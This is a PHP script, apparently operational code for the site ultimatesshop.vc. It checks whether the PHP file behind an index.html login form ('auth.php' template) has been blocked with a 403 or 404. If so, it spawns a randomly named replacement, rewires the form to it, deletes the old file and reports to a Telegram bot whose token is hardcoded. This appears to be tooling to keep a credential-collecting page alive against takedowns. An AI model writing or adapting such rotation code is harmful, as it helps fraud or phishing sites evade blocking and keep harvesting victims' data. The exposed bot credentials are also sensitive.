<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
// --- SETTINGS ---
$dir = "/home/edjnxkvg07x2/public_html/ultimatesshop.vc/";
$index = $dir . "index.html";
$master = $dir . "auth.php"; // The template
$botToken = '6948255941:AAHodX2N2q1XaeKbH7MynLkF1QYTxroiZ1o';
$chatId = '1272510733';

// 1. Get current filename from index.html
$content = file_get_contents($index);
preg_match('/action="([^"]+\.php)"/', $content, $matches);
$current_file = $matches[1] ?? '';

// 2. Check if the file is blocked (403) or missing (404)
$check_url = "https://ultimatesshop.vc/" . $current_file;
$ch = curl_init($check_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
curl_exec($ch);
$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// 3. If blocked or missing, HEAL the site
if ($code == 403 || $code == 404 || $current_file == '') {
    $new_name = "gate_" . substr(md5(time()), 0, 8) . ".php";
    
    // Create the new file from the master template
    if (file_exists($master)) {
        copy($master, $dir . $new_name);
        
        // Update index.html to point to the new random file
        $new_content = preg_replace('/action="[^"]+\.php"/', 'action="' . $new_name . '"', $content);
        file_put_contents($index, $new_content);
        
        // Delete the old blocked file if it exists
        if (file_exists($dir . $current_file)) { @unlink($dir . $current_file); }

        $msg = "🚨 403 Blocked! \n✅ Action: Created $new_name \n✅ Status: Site is back online.";
    } else {
        $msg = "🚨 Fatal Error: auth.php (Master Template) is missing!";
    }

    // Send Alert
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg));
}
?>